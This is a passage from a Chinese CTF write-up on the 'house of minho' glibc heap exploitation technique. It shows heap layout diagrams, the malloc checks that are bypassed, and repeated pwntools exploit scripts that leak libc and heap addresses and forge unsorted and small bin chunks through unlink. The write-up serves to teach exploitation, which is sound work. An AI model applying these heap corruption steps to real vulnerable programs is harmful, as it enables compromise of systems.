class=\"code\"><pre><span class=\"line\">     | prev_size |  size      |</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0x00 |           |  0x50      |    </span><br><span class=\"line\">0x10 | fd        |  bk        |    -- 可控起始位置</span><br><span class=\"line\">0x20 |           |  0x31      |</span><br><span class=\"line\">0x30 | fake fd   |  fake bk   |</span><br><span class=\"line\">     +------------------------+    </span><br><span class=\"line\">0x50 | 0x30      |  0x?0      |    -- 这里的prev_inuse设置为0</span><br><span class=\"line\">0x90 |           |            |    </span><br><span class=\"line\">0xD0 |           |            |    -- 可控终止位置</span><br><span class=\"line\">     +------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>使得在free掉下方堆块的时候可以向后合并，这样子就可以完成溢出可控距离的扩展</p>\n<p>那么这个时候再来讨论一下可控长度，我们此时修改Unsorted bin内的布局，此时我们发现可控距离完全足够进行布局了！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">     | prev_size |  size      |</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0x00 |           |  0x50      |    </span><br><span class=\"line\">0x10 | fd        |  bk        |    -- 可控起始位置</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0x20 |           |  0x91      |    &lt;- Unsorted bin  </span><br><span class=\"line\">0x90 |           |            |</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0xB0 |           |  0x10      |    -- Chunk A</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0xC0 |           |  0x11      |    -- Chunk B</span><br><span class=\"line\">     +------------------------+</span><br><span class=\"line\">0xD0 |           |            |    -- 可控终止位置</span><br></pre></td></tr></table></figure>\n\n<p>（仔细观察上面三个布局演示，可控起始和终止的偏移从未变化，仅仅通过Unlink之后利用率提高了）</p>\n<p>如何实现Unlink？</p>\n<p>只需要满足下面的条件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;fd = p;</span><br><span class=\"line\">p-&gt;bk = p;</span><br><span class=\"line\">next(p)-&gt;prev_inuse = <span class=\"number\">0</span>;</span><br><span class=\"line\">next(p)-&gt;prev_size = p-&gt;size;</span><br></pre></td></tr></table></figure>\n\n<p>绕过源码中，下面这个检查</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mchunkptr fd = p-&gt;fd;</span><br><span class=\"line\">mchunkptr bk = p-&gt;bk;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class=\"number\">0</span>))</span><br><span class=\"line\">  malloc_printerr (<span class=\"string\">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>但是但是，现在还有一个问题，实现unlink攻击，需要free掉一个大的堆块进入Unsorted bin内，也就是说，我们需要修改原来0x90堆块的size改大，并需要满足free的Unsorted bin检查，也就是，尽量不要进入向前合并流程（因为我们本来可控的空间就只有上面的<code>[0x10,0xD0]</code>），那么需要如何做呢？请读者再压下脑栈，马上就要串起来了，继续往下看！</p>\n<h2 id=\"伪造Unsorted-bin\"><a href=\"#伪造Unsorted-bin\" class=\"headerlink\" title=\"伪造Unsorted bin\"></a>伪造Unsorted bin</h2><p>我们再次回顾一下当前的堆布局，可以看到当前unsorted bin下方有一个0x10和0x11的堆块，那么我们假设，如果有某种方法，使得0x90这个堆块覆盖成以下的红色框框圈起来呢？并且是否有方法让下方0x11堆块之后的prev_inuse变成1呢？（为何要为1，因为要防止合并）</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118013645858.png\" alt=\"image-20231118013645858\"></p>\n<p>什么时候能修改最下方堆块的内容呢？答案是还是<code>scanf</code>！</p>\n<p>scanf的缓冲区会申请再堆内，那我如果缓冲区足够大是否能够刚好往0x11堆块的后面size内写入一些数据呢？写入多少呢？</p>\n<p><code>0x33</code>！！！因为这个ascii字符是<code>3</code>，也就是选择free的菜单选项，什么时候写入呢？当然是最最最开始的时候，堆十分“干净”的时候啦</p>\n<p>那么经过测试，再所有操作之前输入0xd58个字符0以及一个字符3即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free3</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free3(<span class=\"number\">0xd59</span>) <span class=\"comment\"># 这里就是污染0x11堆块之后的堆块的size位置</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>))</span><br></pre></td></tr></table></figure>\n\n<p>让我们再看看堆块长什么样子了</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118014409013.png\" alt=\"image-20231118014409013\"></p>\n<p>WoW！！成功污染！那么我们就能成功伪造Unsorted bin了，稍微微调以下代码可以得到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>) </span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里微调了0x90堆块的size位置，不再是修复而是伪造</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xd01</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>此时我们可以看到unsorted bin内如愿以偿的放入了我们的Fake Chunk！</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118014647807.png\" alt=\"image-20231118014647807\"></p>\n<h2 id=\"Unlink攻击以及Smallbin伪造攻击实施\"><a href=\"#Unlink攻击以及Smallbin伪造攻击实施\" class=\"headerlink\" title=\"Unlink攻击以及Smallbin伪造攻击实施\"></a>Unlink攻击以及Smallbin伪造攻击实施</h2><p>感谢你耐心看到这里，相信你现在脑栈已经快爆了，终于我们迎来了弹出脑栈的步骤了</p>\n<p>将上文的Unlink攻击实施，微调Exp可以得到如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里修改了unlink攻击的内容</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>此时堆块就不那么好看了。</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118015159589.png\" alt=\"image-20231118015159589\"></p>\n<p>如此查看我们可以发现unlink成功实施了，Unsorted bin内第一个堆块从0xd00变成了0xd30</p>\n<p>那么继续我们将伪造Small bin的攻击实施，再次微调Exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这次微调了这里，加入了上文提到的Chunk AB的布置</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0x00</span>) + p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里就开始修改Unsorted bin内容，使得在Unsorted bin内伪造一个Small bin大小的堆块</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: heap_base + <span class=\"number\">0x380</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc_base + <span class=\"number\">0x219ce0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>) <span class=\"comment\"># 这里触发使得Unsorted bin进入Samll bin</span></span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>让我们再次检验堆块的结构！完美成功进入了Small bin！！！</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118015627633.png\" alt=\"image-20231118015627633\"></p>\n<p>那么接下来我们就要开始在Small bin里面伪造一条多个0x90的链条，使得再次malloc(0x80)命中small bin的时候，放入Tcache bin中</p>\n<h2 id=\"修改Small-bin\"><a href=\"#修改Small-bin\" class=\"headerlink\" title=\"修改Small bin\"></a>修改Small bin</h2><p>首先我们需要知道我们能改动多长？0x80长度，然而除去tcache bin的fd和bk位置，仅剩下0x70长度可以可控，也就是说，我们需要在0x70的长度中尽可能多的伪造0x90堆块，并串起来</p>\n<p>我们仅仅只能伪造3个0x90的堆块，如何伪造？</p>\n<p>可以参考如下图的伪造方法，可以看到这里bk连线串成了一条链</p>\n<p><img src=\"/p/houseofminho-wp/houseofminho_smallbin.png\" alt=\"houseofminho_smallbin\"></p>\n<p>注意红色Chunk位置的fd设置，需要绕过small bin中的检查（下面源码），而黄色的绿色的fd是否需要设置，留给读者们讨论</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class=\"line\">  malloc_printerr (<span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>那么稍微微调一下exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span 